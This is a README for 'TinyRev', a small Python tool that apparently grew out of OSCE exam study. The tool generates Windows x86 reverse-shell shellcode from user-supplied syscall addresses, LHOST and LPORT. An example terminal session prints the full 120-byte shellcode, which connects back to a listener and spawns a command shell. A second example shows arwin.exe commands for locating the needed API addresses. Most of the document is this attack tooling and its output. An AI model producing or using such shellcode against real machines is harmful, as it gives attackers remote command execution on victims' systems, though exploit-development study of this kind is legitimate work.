## TinyRev

This is just a wrapper on absolomb's reverse shell they describe [on their blog](https://www.absolomb.com/2018-07-24-VulnServer-GTER/). This will literally just create the shellcode based on configurable syscall addresses, LHOST, and LPORT arguments, you still have to make sure your stack-alignment is correct. The shellcode should be 120 bytes long. 

**Warning**, this wrapper is very hacky and probably not very useful lol but I was very bored today. I'm pretty sure ASLR kills this approach.

## Usage

Default usage:
`python tinyrev.py`

To get the command line syntax you need for arwin.exe to find the syscall addresses:
`python tinyrev.py -a, --arwin`

## Example

```terminal_session
root@kali:~/OSCE/ # python tinyrev.py                                    
Enter WSASocketA address (example - 7718E562): 7718E562
Enter LHOST IP (example - 192.168.1.211): 192.168.1.211
Enter LPORT (example - 443): 443
Enter connect address (example - 7718E562): 771868f5
Enter CreateProcessA address (example - 7718E562): 76a42082
Enter variable name for shellcode: revshell


revshell  = "\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\xbb\x62"
revshell += "\xe5\x18\x77\x31\xc0\xff\xd3\x96\x68\xc0\xa8\x01\xd3\x66\x68\x01"
revshell += "\xbb\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x56\xbb\xf5"
revshell += "\x68\x18\x77\xff\xd3\xba\x63\x63\x6d\x64\xc1\xea\x08\x52\x89\xe1"
revshell += "\x31\xd2\x83\xec\x10\x89\xe3\x56\x56\x56\x52\x52\x31\xc0\x40\xc1"
revshell += "\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04"
revshell += "\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50\x52\x52\x51"
revshell += "\x52\xbb\x82\x20\xa4\x76\xff\xd3"


STACK ALIGNMENT NOT INCLUDED! ;)
```

## Example 2

```terminal_session
root@kali:~/OSCE/ # python tinyrev.py --arwin                            
To Retrieve WSASocketA Address: arwin.exe ws2_32 WSASocketA
To Retrieve connect Address: arwin.exe ws2_32 connect
To Retrieve CreateProcessA Address: arwin.exe kernel32 CreateProcessA
```

## Thanks to absolomb who is a genius.


